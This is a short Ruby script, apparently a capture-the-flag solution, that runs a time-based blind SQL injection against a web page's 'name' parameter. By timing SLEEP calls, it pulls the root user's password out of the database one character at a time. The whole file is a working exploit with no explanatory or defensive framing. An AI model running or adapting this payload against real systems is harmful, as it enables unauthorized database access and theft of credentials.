require 'net/http'

$stdout.sync = true

target = URI('http://www.adum.com/inscrutable/')

subquery = "SELECT password FROM user WHERE name='root'"
params = "name='||SLEEP(ASCII(SUBSTR((#{subquery}),%d,1))-96)#"

index = 1
loop do
  target.query = params % index
  start = Time::now
  Net::HTTP.get target
  stop = Time::now
  break if stop - start <= 1
  print (stop - start + 96).to_i.chr
  index += 1
end
